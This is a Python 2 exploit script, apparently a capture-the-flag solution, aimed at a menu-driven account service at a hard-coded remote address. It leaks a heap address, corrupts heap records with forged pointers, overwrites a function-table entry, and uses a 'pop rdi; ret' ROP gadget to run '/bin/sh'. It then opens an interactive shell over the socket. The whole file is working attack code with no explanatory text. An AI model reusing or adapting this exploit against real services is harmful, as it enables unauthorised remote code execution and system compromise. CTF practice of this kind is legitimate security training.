import socket
import struct
import telnetlib
from hexdump import* 
import time
def recv_until(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp:break
		r += tmp
	return r

#s = socket.create_connection(['0',1234])
s = socket.create_connection(['112.166.114.138', 45872])
def leak(s,dat):
	recv_until(s,'$')
	s.send('2\n')
	recv_until(s,':')
	s.send(dat+'\n')
	recv_until(s,':')
	s.send(dat+'\n')
        recv_until(s,':')
        s.send(dat+'\n')
        recv_until(s,':')
        s.send(dat+'\n')
	recv_until(s,':')
	s.send('a'*15+'\n')
	recv_until(s,':')
	s.send(dat+'\n')
	recv_until(s,'$')
	s.send('1\n')
	recv_until(s,':')
        s.send(dat+'\n')
        recv_until(s,':')
        s.send(dat+'\n')
	recv_until(s,'$')
	s.send('1\n') #trigger leak
	addr = struct.unpack('<Q',recv_until(s,'Con')[-8:-4]+"\x00"*4)[0]
	#print hexdump(recv_until(s,'Con'))
	print "leak : %08x"%addr
	s.send('4\n')
	return addr
def make_trash(s,dat):
	s.send('2\n')
	recv_until(s,':')
	s.send(dat+'\n')	
	recv_until(s,'Password')
	s.send(dat+'\n')
        recv_until(s,':')
        s.send(dat+'\n')
        recv_until(s,':')
        s.send(dat+'\n')
	recv_until(s,':')
	s.send(dat+'\n')
	recv_until(s,':')
	s.send(struct.pack('<Q',0x0401AB8)+'\n')
debug = raw_input()
chunk1 = leak(s,'user1')
recv_until(s,'$')
time.sleep(1)
make_trash(s,'user2')
time.sleep(1)
make_trash(s,'user3')
print "****calculate****"
chunk2 = chunk1 + 0x110 + 0x8 + 0x8
chunk3 = chunk2 + 0x110 + 0x8 + 0x8
print "chunk2 : %08x"%chunk2
print "chunk3 : %08x"%chunk3
print "****interact****"
recv_until(s,'$')
s.send('1\n')
recv_until(s,'ID')
s.send('user1\n')
recv_until(s,'Password')
s.send('user1\n')
recv_until(s,'$')
s.send('3\n')

recv_until(s,'$')
s.send('1\n')
recv_until(s,'ID')
s.send('user2\n')
recv_until(s,'Password')
s.send('user2\n')
recv_until(s,'$')
s.send('2\n')
recv_until(s,'(Yes / No)')
s.send('yes\n')
recv_until(s,'size :')
s.send(str(0x110)+'\n')
recv_until(s,'contents')
dat = ""
#dat += struct.pack('<Q',0x4027F0)
dat += struct.pack('<Q',chunk3+0x98-0x18)
dat += "/bin/sh;"
dat += "\x00"*(16-8)
dat += "user1"
dat += "\x00"*(43)
dat += "A"*(0x88-len(dat))
#dat += "AAAA"*4
dat += struct.pack('<Q',0x400E90)
dat += struct.pack('<Q',0x603020-0x90)
s.send(dat+"\n")
recv_until(s,'$')
time.sleep(1)
s.send('4\n')
time.sleep(1)
recv_until(s,'5. Exit')
s.send('1\n')
recv_until(s,'ID')
s.send('/bin/sh;\n')
recv_until(s,'Password')
s.send('user1\n')
recv_until(s,'$')
s.send('2\n')

recv_until(s,'(Yes / No)')
s.send('yes\n')
recv_until(s,'size :')
s.send(str(0x110)+'\n')
dat = ""
dat += struct.pack('<Q',0x0000000000402413) #pop rdi ; ret
dat += struct.pack('<Q',chunk1+0x8)
dat += struct.pack('<Q',0x400E90)
time.sleep(3)
s.send(dat+'\n')
s.send('id\n')
print [s.recv(1024)]
s.send('id\n')
print [s.recv(1024)]
s.send('id\n')
print [s.recv(1024)]
s.send('id\n')
print [s.recv(1024)]
t = telnetlib.Telnet()
t.sock = s
t.interact()
